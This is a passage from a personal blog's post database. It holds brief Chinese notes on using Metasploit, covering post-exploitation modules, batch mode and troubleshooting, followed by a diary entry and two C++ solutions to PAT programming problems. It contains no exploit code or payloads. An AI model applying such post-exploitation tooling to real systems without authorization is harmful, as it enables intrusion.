Post</h3><p>主要用于攻击成功后的工作。比如：内网攻击，本地提权，敏感信息获取等。<br>Metasploit中的后渗透攻击模块的名字成为Meterpretr。</p>\n<h2 id=\"基本攻击\"><a href=\"#基本攻击\" class=\"headerlink\" title=\"基本攻击\"></a>基本攻击</h2><p><a href=\"http://lmwen.top/2016/08/06/metasploit%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/\">简洁而基础的一篇文章</a></p>\n<h2 id=\"常用命令\"><a href=\"#常用命令\" class=\"headerlink\" title=\"常用命令\"></a>常用命令</h2><p><a href=\"https://www.i0day.com/1182.html\">metasploit终端命令大全 MSF</a></p>\n<h2 id=\"关于批量化\"><a href=\"#关于批量化\" class=\"headerlink\" title=\"关于批量化\"></a>关于批量化</h2><p>msfcli已经不再使用，取而代之的是<code>msfconsole -x</code>。同时，使用<code>mafconsole -r</code> 可以加载脚本来使用msf。</p>\n<h2 id=\"一些小坑\"><a href=\"#一些小坑\" class=\"headerlink\" title=\"一些小坑\"></a>一些小坑</h2><ol>\n<li><p>msf的更新和安装方式是相关的。在kali上只能用apt-get的方式更新，如果是git得到，可以使用<code>msfupdate</code>。如果在kali上用<code>msfupdate</code>可能会遇到未知错误。</p>\n</li>\n<li><p><code>Failed to connect to the database: could not connect to server: Connection refused</code>遇到注重错误一般是<code>postgresql</code>服务没开，按照<a href=\"https://community.rapid7.com/thread/9302\">官方回答</a>修改即可。</p>\n</li>\n</ol>\n"},{"title":"Original Life","date":"2017-07-10T08:15:58.000Z","_content":"\n## 2017/7/10\n\nI spended half of afternoon expanding my pc RAM today. It's so excited that I can run XP and Kali at the same time.**XD**\n\n## 2017/7/28\n\n暑假实习去了。","source":"_posts/Original-Life.md","raw":"---\ntitle: Original Life\ntags:\n  - life\ncategories: []\ndate: 2017-07-10 16:15:58\n---\n\n## 2017/7/10\n\nI spended half of afternoon expanding my pc RAM today. It's so excited that I can run XP and Kali at the same time.**XD**\n\n## 2017/7/28\n\n暑假实习去了。","slug":"Original-Life","published":1,"updated":"2017-07-28T03:08:53.047Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0jzb001nhv18mfqbz4fb","content":"<h2 id=\"2017-7-10\"><a href=\"#2017-7-10\" class=\"headerlink\" title=\"2017/7/10\"></a>2017/7/10</h2><p>I spended half of afternoon expanding my pc RAM today. It’s so excited that I can run XP and Kali at the same time.<strong>XD</strong></p>\n<h2 id=\"2017-7-28\"><a href=\"#2017-7-28\" class=\"headerlink\" title=\"2017/7/28\"></a>2017/7/28</h2><p>暑假实习去了。</p>\n","excerpt":"","more":"<h2 id=\"2017-7-10\"><a href=\"#2017-7-10\" class=\"headerlink\" title=\"2017/7/10\"></a>2017/7/10</h2><p>I spended half of afternoon expanding my pc RAM today. It’s so excited that I can run XP and Kali at the same time.<strong>XD</strong></p>\n<h2 id=\"2017-7-28\"><a href=\"#2017-7-28\" class=\"headerlink\" title=\"2017/7/28\"></a>2017/7/28</h2><p>暑假实习去了。</p>\n"},{"title":"PAT advanced 1001","date":"2017-02-01T16:02:49.000Z","_content":"\n## Description\n\n> 1001.A+B Format(20)\n时间限制\n400 ms\n内存限制\n65536 kB\n代码长度限制\n16000 B\n判题程序\nStandard\n作者\nCHEN, Yue\nCalculate a + b and output the sum in standard format -- that is, the digits must be separated into groups of three by commas (unless there are less than four digits).\n\n> Input\n\n> Each input file contains one test case. Each case contains a pair of integers a and b where -1000000 <= a, b <= 1000000. The numbers are separated by a space.\n\n> Output\n\n> or each test case, you should output the sum of a and b in one line. The sum must be written in the standard format.\n\n> Sample Input\n-1000000 9\nSample Output\n-999,991\n\n暴力可以解决PAT上不少问题= =\n\n## Code \n\n```\n#include <cstdio>\n#include <queue>\n#include <vector>\n#include <cstring>\n#include <string>\n#include <iostream>\n#include <algorithm>\n\ntypedef long long LL;\nusing namespace std;\n\nint main()\n{\n\tint flag = 0;\n\tint j = 0;\n\tLL a, b, c;\n\tint num[20];\n\tcin >> a >> b;\n\tc = a + b;\n\tif (c < 0){ flag = 1; c = -c; }\n\tif (flag)cout << '-';\n\tif (c == 0)\n\t{\n\t\tnum[0] = 0;\n\t\tj = 1;\n\t}\n\twhile (c){ num[j] = c % 10; c = c / 10; j++; }\n\tfor (int i = j - 1; i > -1; i--)\n\t{\n\t\tcout << num[i];\n\t\tif (i % 3 == 0 && i)\n\t\t\tcout << ',';\n\t}\n\t\tcout << endl;\n\treturn 0;\n}\n```\n","source":"_posts/PAT-advanced-1001.md","raw":"---\ntitle: PAT advanced 1001\ntags: [PAT]\ncategories: []\ndate: 2017-02-02 00:02:49\n---\n\n## Description\n\n> 1001.A+B Format(20)\n时间限制\n400 ms\n内存限制\n65536 kB\n代码长度限制\n16000 B\n判题程序\nStandard\n作者\nCHEN, Yue\nCalculate a + b and output the sum in standard format -- that is, the digits must be separated into groups of three by commas (unless there are less than four digits).\n\n> Input\n\n> Each input file contains one test case. Each case contains a pair of integers a and b where -1000000 <= a, b <= 1000000. The numbers are separated by a space.\n\n> Output\n\n> or each test case, you should output the sum of a and b in one line. The sum must be written in the standard format.\n\n> Sample Input\n-1000000 9\nSample Output\n-999,991\n\n暴力可以解决PAT上不少问题= =\n\n## Code \n\n```\n#include <cstdio>\n#include <queue>\n#include <vector>\n#include <cstring>\n#include <string>\n#include <iostream>\n#include <algorithm>\n\ntypedef long long LL;\nusing namespace std;\n\nint main()\n{\n\tint flag = 0;\n\tint j = 0;\n\tLL a, b, c;\n\tint num[20];\n\tcin >> a >> b;\n\tc = a + b;\n\tif (c < 0){ flag = 1; c = -c; }\n\tif (flag)cout << '-';\n\tif (c == 0)\n\t{\n\t\tnum[0] = 0;\n\t\tj = 1;\n\t}\n\twhile (c){ num[j] = c % 10; c = c / 10; j++; }\n\tfor (int i = j - 1; i > -1; i--)\n\t{\n\t\tcout << num[i];\n\t\tif (i % 3 == 0 && i)\n\t\t\tcout << ',';\n\t}\n\t\tcout << endl;\n\treturn 0;\n}\n```\n","slug":"PAT-advanced-1001","published":1,"updated":"2017-02-02T18:33:41.170Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0jze001ohv187uro7afd","content":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>1001.A+B Format(20)<br>时间限制<br>400 ms<br>内存限制<br>65536 kB<br>代码长度限制<br>16000 B<br>判题程序<br>Standard<br>作者<br>CHEN, Yue<br>Calculate a + b and output the sum in standard format – that is, the digits must be separated into groups of three by commas (unless there are less than four digits).</p>\n<p>Input</p>\n<p>Each input file contains one test case. Each case contains a pair of integers a and b where -1000000 &lt;= a, b &lt;= 1000000. The numbers are separated by a space.</p>\n<p>Output</p>\n<p>or each test case, you should output the sum of a and b in one line. The sum must be written in the standard format.</p>\n<p>Sample Input<br>-1000000 9<br>Sample Output<br>-999,991</p>\n</blockquote>\n<p>暴力可以解决PAT上不少问题= =</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;queue&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;vector&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstring&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;algorithm&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">int</span> flag = <span class=\"number\">0</span>;</div><div class=\"line\">\t<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>;</div><div class=\"line\">\tLL a, b, c;</div><div class=\"line\">\t<span class=\"keyword\">int</span> num[<span class=\"number\">20</span>];</div><div class=\"line\">\t<span class=\"built_in\">cin</span> &gt;&gt; a &gt;&gt; b;</div><div class=\"line\">\tc = a + b;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (c &lt; <span class=\"number\">0</span>)&#123; flag = <span class=\"number\">1</span>; c = -c; &#125;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (flag)<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">'-'</span>;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (c == <span class=\"number\">0</span>)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tnum[<span class=\"number\">0</span>] = <span class=\"number\">0</span>;</div><div class=\"line\">\t\tj = <span class=\"number\">1</span>;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">while</span> (c)&#123; num[j] = c % <span class=\"number\">10</span>; c = c / <span class=\"number\">10</span>; j++; &#125;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = j - <span class=\"number\">1</span>; i &gt; <span class=\"number\">-1</span>; i--)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"built_in\">cout</span> &lt;&lt; num[i];</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (i % <span class=\"number\">3</span> == <span class=\"number\">0</span> &amp;&amp; i)</div><div class=\"line\">\t\t\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">','</span>;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n","excerpt":"","more":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>1001.A+B Format(20)<br>时间限制<br>400 ms<br>内存限制<br>65536 kB<br>代码长度限制<br>16000 B<br>判题程序<br>Standard<br>作者<br>CHEN, Yue<br>Calculate a + b and output the sum in standard format – that is, the digits must be separated into groups of three by commas (unless there are less than four digits).</p>\n<p>Input</p>\n<p>Each input file contains one test case. Each case contains a pair of integers a and b where -1000000 &lt;= a, b &lt;= 1000000. The numbers are separated by a space.</p>\n<p>Output</p>\n<p>or each test case, you should output the sum of a and b in one line. The sum must be written in the standard format.</p>\n<p>Sample Input<br>-1000000 9<br>Sample Output<br>-999,991</p>\n</blockquote>\n<p>暴力可以解决PAT上不少问题= =</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;queue&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;vector&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstring&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;algorithm&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">int</span> flag = <span class=\"number\">0</span>;</div><div class=\"line\">\t<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>;</div><div class=\"line\">\tLL a, b, c;</div><div class=\"line\">\t<span class=\"keyword\">int</span> num[<span class=\"number\">20</span>];</div><div class=\"line\">\t<span class=\"built_in\">cin</span> &gt;&gt; a &gt;&gt; b;</div><div class=\"line\">\tc = a + b;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (c &lt; <span class=\"number\">0</span>)&#123; flag = <span class=\"number\">1</span>; c = -c; &#125;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (flag)<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">'-'</span>;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (c == <span class=\"number\">0</span>)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tnum[<span class=\"number\">0</span>] = <span class=\"number\">0</span>;</div><div class=\"line\">\t\tj = <span class=\"number\">1</span>;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">while</span> (c)&#123; num[j] = c % <span class=\"number\">10</span>; c = c / <span class=\"number\">10</span>; j++; &#125;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = j - <span class=\"number\">1</span>; i &gt; <span class=\"number\">-1</span>; i--)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"built_in\">cout</span> &lt;&lt; num[i];</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (i % <span class=\"number\">3</span> == <span class=\"number\">0</span> &amp;&amp; i)</div><div class=\"line\">\t\t\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">','</span>;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n"},{"title":"PAT advanced 1002","date":"2017-02-02T16:30:58.000Z","_content":"\n## Description\n\n> 1002.A+B for Polynomials (25)\n\n> Input\n\n> Each input file contains one test case. Each case occupies 2 lines, and each line contains the information of a polynomial: K N1 aN1 N2 aN2 ... NK aNK, where K is the number of nonzero terms in the polynomial, Ni and aNi (i=1, 2, ..., K) are the exponents and coefficients, respectively. It is given that 1 <= K <= 10，0 <= NK < ... < N2 < N1 <=1000.\n\n> Output\n\n> For each test case you should output the sum of A and B in one line, with the same format as the input. Notice that there must be NO extra space at the end of each line. Please be accurate to 1 decimal place.\n\n> Sample Input\n2 1 2.4 0 3.2\n2 2 1.5 1 0.5\n\n> Sample Output\n3 2 1.5 1 2.9 0 3.2\n\n注意保留1位精度，注意把0挑出来\n\n## Code\n\n```\n#include <cstdio>\n#include <queue>\n#include <vector>\n#include <cstring>\n#include <string>\n#include <iostream>\n#include <algorithm>\n\ntypedef long long LL;\nusing namespace std;\n\nint k1;\nint k2;\nint k3 = 0;\nint flag = 0;\nfloat a[1001] = {0};\nfloat b[1001] = {0};\nfloat c[1001] = {0};\n\n\nint main()\n{\n\tcin >> k1;\n\tfor (int i = 0; i < k1; i++){ int tmp; cin >> tmp; cin >> a[tmp]; }\n\tcin >> k2;\n\tfor (int i = 0; i < k2; i++){ int tmp; cin >> tmp; cin >> b[tmp]; }\n\tfor (int i = 1000; i > -1; i--)\n\t{ \n\t\tc[i] = a[i] + b[i]; \n\t\tif (c[i])\n\t\t\tk3++;\n\t}\n\tif (k3) { cout << k3 << ' '; }\n\telse { cout << k3 << endl; return 0; }\n\tfor (int i = 0; !c[i]; i++){ flag = i + 1; }\n\tfor (int i = 1000; i > -1; i--)\n\t{\n\t\tif (c[i] && i != flag)\n\t\t\tprintf(\"%d %.1f \", i, c[i]);\n\t\telse if (c[i] && i == flag)\n\t\t\tprintf(\"%d %.1f\\n\", i, c[i]);\n\t}\n\treturn 0;\n}\n```\n","source":"_posts/PAT-advanced-1002.md","raw":"---\ntitle: PAT advanced 1002\ntags: [PAT]\ncategories: []\ndate: 2017-02-03 00:30:58\n---\n\n## Description\n\n> 1002.A+B for Polynomials (25)\n\n> Input\n\n> Each input file contains one test case. Each case occupies 2 lines, and each line contains the information of a polynomial: K N1 aN1 N2 aN2 ... NK aNK, where K is the number of nonzero terms in the polynomial, Ni and aNi (i=1, 2, ..., K) are the exponents and coefficients, respectively. It is given that 1 <= K <= 10，0 <= NK < ... < N2 < N1 <=1000.\n\n> Output\n\n> For each test case you should output the sum of A and B in one line, with the same format as the input. Notice that there must be NO extra space at the end of each line. Please be accurate to 1 decimal place.\n\n> Sample Input\n2 1 2.4 0 3.2\n2 2 1.5 1 0.5\n\n> Sample Output\n3 2 1.5 1 2.9 0 3.2\n\n注意保留1位精度，注意把0挑出来\n\n## Code\n\n```\n#include <cstdio>\n#include <queue>\n#include <vector>\n#include <cstring>\n#include <string>\n#include <iostream>\n#include <algorithm>\n\ntypedef long long LL;\nusing namespace std;\n\nint k1;\nint k2;\nint k3 = 0;\nint flag = 0;\nfloat a[1001] = {0};\nfloat b[1001] = {0};\nfloat c[1001] = {0};\n\n\nint main()\n{\n\tcin >> k1;\n\tfor (int i = 0; i < k1; i++){ int tmp; cin >> tmp; cin >> a[tmp]; }\n\tcin >> k2;\n\tfor (int i = 0; i < k2; i++){ int tmp; cin >> tmp; cin >> b[tmp]; }\n\tfor (int i = 1000; i > -1; i--)\n\t{ \n\t\tc[i] = a[i] + b[i]; \n\t\tif (c[i])\n\t\t\tk3++;\n\t}\n\tif (k3) { cout << k3 << ' '; }\n\telse { cout << k3 << endl; return 0; }\n\tfor (int i = 0; !c[i]; i++){ flag = i + 1; }\n\tfor (int i = 1000; i > -1; i--)\n\t{\n\t\tif (c[i] && i != flag)\n\t\t\tprintf(\"%d %.1f \", i, c[i]);\n\t\telse if (c[i] && i == flag)\n\t\t\tprintf(\"%d %.1f\\n\", i, c[i]);\n\t}\n\treturn 0;\n}\n```\n","slug":"PAT-advanced-1002","published":1,"updated":"2017-02-02T18:33:58.627Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0jzg001rhv180oxsdgd7","content":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>1002.A+B for Polynomials (25)</p>\n<p>Input</p>\n<p>Each input file contains one test case. Each case occupies 2 lines, and each line contains the information of a polynomial: K N1 aN1 N2 aN2 … NK aNK, where K is the number of nonzero terms in the polynomial, Ni and aNi (i=1, 2, …, K) are the exponents and coefficients, respectively. It is given that 1 &lt;= K &lt;= 10，0 &lt;= NK &lt; … &lt; N2 &lt; N1 &lt;=1000.</p>\n<p>Output</p>\n<p>For each test case you should output the sum of A and B in one line, with the same format as the input. Notice that there must be NO extra space at the end of each line. Please be accurate to 1 decimal place.</p>\n<p>Sample Input<br>2 1 2.4 0 3.2<br>2 2 1.5 1 0.5</p>\n<p>Sample Output<br>3 2 1.5 1 2.9 0 3.2</p>\n</blockquote>\n<p>注意保留1位精度，注意把0挑出来</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;queue&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;vector&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstring&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;algorithm&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">int</span> k1;</div><div class=\"line\"><span class=\"keyword\">int</span> k2;</div><div class=\"line\"><span class=\"keyword\">int</span> k3 = <span class=\"number\">0</span>;</div><div class=\"line\"><span class=\"keyword\">int</span> flag = <span class=\"number\">0</span>;</div><div class=\"line\"><span class=\"keyword\">float</span> a[<span class=\"number\">1001</span>] = &#123;<span class=\"number\">0</span>&#125;;</div><div class=\"line\"><span class=\"keyword\">float</span> b[<span class=\"number\">1001</span>] = &#123;<span class=\"number\">0</span>&#125;;</div><div class=\"line\"><span class=\"keyword\">float</span> c[<span class=\"number\">1001</span>] = &#123;<span class=\"number\">0</span>&#125;;</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">cin</span> &gt;&gt; k1;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; k1; i++)&#123; <span class=\"keyword\">int</span> tmp; <span class=\"built_in\">cin</span> &gt;&gt; tmp; <span class=\"built_in\">cin</span> &gt;&gt; a[tmp]; &#125;</div><div class=\"line\">\t<span class=\"built_in\">cin</span> &gt;&gt; k2;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; k2; i++)&#123; <span class=\"keyword\">int</span> tmp; <span class=\"built_in\">cin</span> &gt;&gt; tmp; <span class=\"built_in\">cin</span> &gt;&gt; b[tmp]; &#125;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1000</span>; i &gt; <span class=\"number\">-1</span>; i--)</div><div class=\"line\">\t&#123; </div><div class=\"line\">\t\tc[i] = a[i] + b[i]; </div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (c[i])</div><div class=\"line\">\t\t\tk3++;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (k3) &#123; <span class=\"built_in\">cout</span> &lt;&lt; k3 &lt;&lt; <span class=\"string\">' '</span>; &#125;</div><div class=\"line\">\t<span class=\"keyword\">else</span> &#123; <span class=\"built_in\">cout</span> &lt;&lt; k3 &lt;&lt; <span class=\"built_in\">endl</span>; <span class=\"keyword\">return</span> <span class=\"number\">0</span>; &#125;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; !c[i]; i++)&#123; flag = i + <span class=\"number\">1</span>; &#125;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1000</span>; i &gt; <span class=\"number\">-1</span>; i--)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (c[i] &amp;&amp; i != flag)</div><div class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d %.1f \"</span>, i, c[i]);</div><div class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (c[i] &amp;&amp; i == flag)</div><div class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d %.1f\\n\"</span>, i, c[i]);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n","excerpt":"","more":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>1002.A+B for Polynomials (25)</p>\n<p>Input</p>\n<p>Each input file contains one test case. Each case occupies 2 lines, and each line contains the information of a polynomial: K N1 aN1 N2 aN2 … NK aNK, where K is the number of nonzero terms in the polynomial, Ni and aNi (i=1, 2, …, K) are the exponents and coefficients, respectively. It is given that 1 &lt;= K &lt;= 10，0 &lt;= NK &lt; … &lt; N2 &lt; N1 &lt;=1000.</p>\n<p>Output</p>\n<p>For each test case you should output the sum of A and B in one line, with the same format as the input. Notice that there must be NO extra space at the end of each line. Please be accurate to 1 decimal place.</p>\n<p>Sample Input<br>2 1 2.4 0 3.2<br>2 2 1.5 1 0.5</p>\n<p>Sample Output<br>3 2 1.5 1 2.9 0 3.2</p>\n</blockquote>\n<p>注意保留1位精度，注意把0挑出来</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div 